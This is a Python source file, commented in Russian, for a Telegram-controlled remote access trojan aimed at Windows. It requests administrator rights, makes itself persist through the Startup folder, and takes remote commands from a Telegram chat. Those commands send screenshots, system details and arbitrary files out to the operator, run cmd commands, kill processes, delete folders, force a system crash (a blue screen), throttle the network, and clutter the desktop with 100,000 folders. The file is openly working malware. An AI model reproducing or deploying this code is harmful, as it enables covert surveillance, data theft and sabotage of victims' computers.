import ctypes
import telebot
import time
import requests
from PIL import ImageGrab
import shutil
import sqlite3
import win32crypt
import platform
import webbrowser
import re
import psutil
from win32com.client import Dispatch
import os
import sys
import subprocess
import ctypes
import time
import logging
import win32com.client
import tempfile

#logging.basicConfig(filename='autostart_log.txt', level=logging.DEBUG)
#logging.debug('Script started.')



bot_token = "токен телграмбота"
chat_id = "айди чата в телеграм"

bot = telebot.TeleBot(bot_token)

manifest_content = '''
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
'''
# Создаем временный файл манифеста
manifest_file_path = os.path.join(tempfile.gettempdir(), 'temp_manifest.manifest')
with open(manifest_file_path, 'w') as manifest_file:
    manifest_file.write(manifest_content)

# Задаем переменную окружения для использования манифеста PyInstaller
os.environ["PYTHONHASHSEED"] = "0"
sys.argv += ['--manifest', manifest_file_path]

# Устанавливаем права администратора
ctypes.windll.shell32.IsUserAnAdmin()

# Удаляем временный файл манифеста
os.remove(manifest_file_path)


def run_as_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    except Exception as e:
        logging.error(f"Error while checking/admin privileges: {e}")
        print(f"Error while checking/admin privileges: {e}")
        raise


def create_shortcut(source, destination):
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(destination)
    shortcut.Targetpath = source
    shortcut.WorkingDirectory = source
    shortcut.IconLocation = source
    shortcut.save()

def main():
    try:
        run_as_admin()

        # Получаем путь к исполняемому файлу
        exe_path = sys.executable

        # Путь к папке автозапуска Windows
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Путь к ярлыку этого файла в папке автозапуска
        shortcut_path = os.path.join(startup_folder, 'AutoStartupScript.lnk')

        # Создание ярлыка
        create_shortcut(exe_path, shortcut_path)
        while True:
            bot.polling()
            time.sleep(1)
    except PermissionError as pe:
        logging.error(f"PermissionError: {pe}")
        print(f"PermissionError: {pe}")
    except KeyboardInterrupt:
        logging.info("Script terminated by user.")
        print("Script terminated by user.")
    except Exception as e:
        logging.exception("An error occurred:")
        print(f"An error occurred: {e}. Waiting for 1 second before retrying.")
        time.sleep(1)


@bot.message_handler(commands=['start', 'Start'])
def send_message(command):
    try:
        bot.send_message(chat_id, "RAT Running\n\nЧтобы узнать команды введите команду /commands")
    except Exception as e:
        logging.error(f"Error sending message: {e}")
        print(f"Error sending message: {e}")



@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])
def send_message(command):
    bot.send_message(chat_id,
                     "Команды: \n /Screen - Скриншот экрана \n /Info - Информация  о пользаваьеля \n /kill_process name.exe - Убить процесс по имени" +
                     "\n /Pwd - Узнать текущую директорию " +
                     "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Open_urls - спам ссылкой \n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку \n /Win_off - отключение ПК"
                     "\n /Folders - создаёт папки на рабочем столе и прячит туда ярлыки \n /Crash - экран смерти \n /inet limit speed 0,1 - настройка скорости инета скрость в mb/s(вместо 0.1 можно пиасть любое число) \n /Cancel_all- отменяет то что можно отменить"
                     "\n /Script_off - выключает скрипт")


@bot.message_handler(commands=['screen', 'Screen'])  # Ждём команды
def send_screen(command):
    bot.send_message(chat_id, "Wait...")  # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab()  # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')  # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')  # Обновляем переменную
    files = {'photo': screen}  # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id,
                  files=files)  # Делаем запрос

@bot.message_handler(commands=['info', 'Info'])
def send_info(message):
    try:
        username = os.getlogin()
        r = requests.get('http://ip.42.pl/raw')
        IP = r.text
        windows = platform.platform()
        processor = platform.processor()

        system_info = {
            'PC': username,
            'IP': IP,
            'OS': windows,
            'Processor': processor
        }

        info_text = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
        bot.send_message(chat_id, f"Информация о системе:\n{info_text}")
    except Exception as e:
        logging.error(f"Error sending system info: {e}")
        print(f"Error sending system info: {e}")


@bot.message_handler(commands=['pwd', 'Pwd'])  # ДИРЕКТОРИЯ
def pwd(command):
    directory = os.path.abspath(os.getcwd())  # Получаем расположение
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory)))  # Отправляем сообщение


@bot.message_handler(commands=["kill_process", "Kill_process"])  # ПРОЦЕССЫ
def kill_process(message):
    user_msg = "{0}".format(message.text)  # Переменная в которой содержится сообщение
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1])  # Убиваем процесс по имени
    bot.send_message(chat_id, "Готово!")


@bot.message_handler(commands=["cmd", "Cmd"])  # CMD
def cmd_command(message):
    user_msg = "{0}".format(message.text)
    subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', user_msg.split(" ")[1]])  # Запускаем cmd
    bot.send_message(chat_id, "Готово!")


@bot.message_handler(commands=["open_url", "Open_url"])  # ОТКРЫТЬ ССЫЛКУ
def open_url(message):
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]  # Объявляем переменную, в которой содержится url
    webbrowser.open_new_tab(url)  # Открываем ссылку
    bot.send_message(chat_id, "Готово!")


@bot.message_handler(commands=["open_urls", "Open_urls"])
def open_urls(message):
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]
    kolvo = user_msg.split(" ")[2]
    kolvo2 = int(kolvo)
    for i in range(kolvo2):
        webbrowser.open_new_tab(url)  # Открываем ссылку
    bot.send_message(chat_id, "Готово!")


@bot.message_handler(commands=["ls", "Ls"])  # ВСЕ ФАЙЛЫ
def ls_dir(commands):
    dirs = '\n'.join(os.listdir(path="."))  # Обявим переменную dirs, в которой содержатся все папки и файлы.
    bot.send_message(chat_id, "Files: " + "\n" + dirs)


@bot.message_handler(commands=["cd", "Cd"])  # ПЕРЕЙТИ В ПАПКУ
def cd_dir(message):
    user_msg = "{0}".format(message.text)
    path2 = user_msg.split(" ")[1]  # Переменная - папка
    os.chdir(path2)  # Меняем директорию
    bot.send_message(chat_id, "Директория изменена на " + path2)


@bot.message_handler(commands=["Download", "download"])  # ЗАГРУЗКА ФАЙЛА
def download_file(message):
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1]  # Переменная, в которой содержится имя файла
    doccc = {'document': open(docc, 'rb')}  # Переменная для POST запроса

    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id,
                  files=doccc)  # Отправляем файл


@bot.message_handler(commands=["Rm_dir", "rm_dir"])  # УДАЛИТЬ ПАПКУ
def delete_dir(message):
    user_msg = "{0}".format(message.text)
    path2del = user_msg.split(" ")[1]  # Переменная - имя папка
    os.removedirs(path2del)  # Удаляем папку
    bot.send_message(chat_id, "Директория " + path2del + " удалена")


@bot.message_handler(commands=["win_off", "Win_off"])
def win_off(message):
    bot.send_message(chat_id, "Готово!")
    os.system("shutdown /h")


@bot.message_handler(commands=["crash", "Crash"])  # КРАШ СИСТЕМЫ
def crash_system(message):
    bot.send_message(chat_id, "Устанавливаю критическую ошибку системы...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)


def get_default_network_adapter_name():
    adapters = psutil.net_if_stats()
    for adapter, stats in adapters.items():
        if stats.isup and not adapter.startswith('Loopback'):
            return adapter
    return None


@bot.message_handler(commands=['inet', 'Inet'])
def handle_message(message):
    text = message.text.lower()
    chat_id = message.chat.id

    def limit_network_speed(speed):
        adapter_name = get_default_network_adapter_name()
        if adapter_name:
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "subinterface", adapter_name, f"mtu={speed}", "store=persistent"])
            subprocess.run(
                ["netsh", "interface", "ipv6", "set", "subinterface", adapter_name, f"mtu={speed}", "store=persistent"])
            bot.send_message(chat_id, f"Скорость интернета ограничена до {speed} Мбит/с.")
        else:
            bot.send_message(chat_id, "Не удалось найти активный сетевой адаптер.")

    def hide_network_icon():
        subprocess.run(
            ['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\NetworkConnection', '/v',
             'HideIcons', '/t', 'REG_DWORD', '/d', '1', '/f'])
        bot.send_message(chat_id, "Иконка сети скрыта.")

    if "limit speed" in text:
        speed_match = re.search(r'\d+', text)
        if speed_match:
            speed = int(speed_match.group())
            limit_network_speed(speed)
        else:
            bot.send_message(chat_id, "Не удалось извлечь значение скорости из сообщения.")
    elif "hide icon" in text:
        hide_network_icon()
    else:
        bot.send_message(chat_id, "Неправильная команда.")


@bot.message_handler(commands=['cancel_all', 'Cancel_all'])
def cancel_all(message):
    adapter_name = get_default_network_adapter_name()
    if adapter_name:
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "subinterface", adapter_name, "mtu=1500", "store=persistent"])
        subprocess.run(
            ["netsh", "interface", "ipv6", "set", "subinterface", adapter_name, "mtu=1500", "store=persistent"])
        subprocess.run(
            ['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\NetworkConnection', '/v',
             'HideIcons', '/t', 'REG_DWORD', '/d', '0', '/f'])

        bot.send_message(chat_id, "Действия отменены. Сетевая скорость и иконка сети восстановлены.")

def create_folders(num_folders):
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')  # Получаем путь к рабочему столу
    for i in range(1, num_folders + 1):
        folder_name = f'Папка_{i}'
        folder_path = os.path.join(desktop_path, folder_name)

        # Проверяем, существует ли папка, прежде чем создавать
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)  # Создаем папку

def move_files_to_folders(num_folders):
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')  # Получаем путь к рабочему столу
    for i in range(1, num_folders + 1):
        folder_name = f'Папка_{i}'
        folder_path = os.path.join(desktop_path, folder_name)
        for filename in os.listdir(desktop_path):
            if filename != folder_name:
                source = os.path.join(desktop_path, filename)
                destination = os.path.join(folder_path, filename)
                shutil.move(source, destination)  # Перемещаем файлы в папки



@bot.message_handler(commands=['folders', 'Folders'])
def create_and_move_folders(message):
    num_folders = 100000  # Здесь вы указываете желаемое количество папок

    create_folders(num_folders)
    move_files_to_folders(num_folders)
    bot.send_message(chat_id, f"Создано {num_folders} папок на рабочем столе, и файлы перемещены.")



@bot.message_handler(commands=['Script_off', 'script_off'])
def shutdown(message):
    bot.send_message(chat_id, "Программа будет выключена.")
    os._exit(0)


if __name__ == "__main__":
    main()
    bot.polling()

